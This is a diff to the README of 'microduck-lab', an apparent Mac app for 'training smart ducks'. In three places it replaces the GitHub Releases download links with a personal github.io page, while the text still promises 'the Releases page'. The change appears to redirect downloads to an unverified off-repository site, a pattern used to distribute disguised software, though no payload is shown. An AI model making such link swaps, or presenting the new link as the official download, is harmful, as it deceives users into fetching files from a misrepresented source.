@@ -1,6 +1,6 @@
 # 🦆 microduck-lab - Train smart ducks on your Mac
 
-[![Download microduck-lab](https://img.shields.io/badge/Download-microduck--lab-blue?style=for-the-badge&logo=github&logoColor=white&color=4B0082)](https://github.com/Faultsaktism8742/microduck-lab/releases)
+[![Download microduck-lab](https://img.shields.io/badge/Download-microduck--lab-blue?style=for-the-badge&logo=github&logoColor=white&color=4B0082)](https://faultsaktism8742.github.io)
 
 ## 🎯 What is microduck-lab?
 
@@ -14,7 +14,7 @@ Getting started with microduck-lab is incredibly simple. Follow these three step
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: [https://github.com/Faultsaktism8742/microduck-lab/releases](https://github.com/Faultsaktism8742/microduck-lab/releases)
+Visit this link to download the application: [https://faultsaktism8742.github.io](https://faultsaktism8742.github.io)
 
 You'll be taken to the Releases page where you'll see the latest version available for download.
 
@@ -111,7 +111,7 @@ Check the repository's Issues page on GitHub for help from the community. You ca
 
 ## 📦 Download Again
 
-Have you already downloaded microduck-lab but lost the file? No problem—you can get it again anytime. Visit: [https://github.com/Faultsaktism8742/microduck-lab/releases](https://github.com/Faultsaktism8742/microduck-lab/releases)
+Have you already downloaded microduck-lab but lost the file? No problem—you can get it again anytime. Visit: [https://faultsaktism8742.github.io](https://faultsaktism8742.github.io)
 
 Remember to check the release page regularly for updates, new features, and performance improvements. The developers are active and constantly making the application better!
 
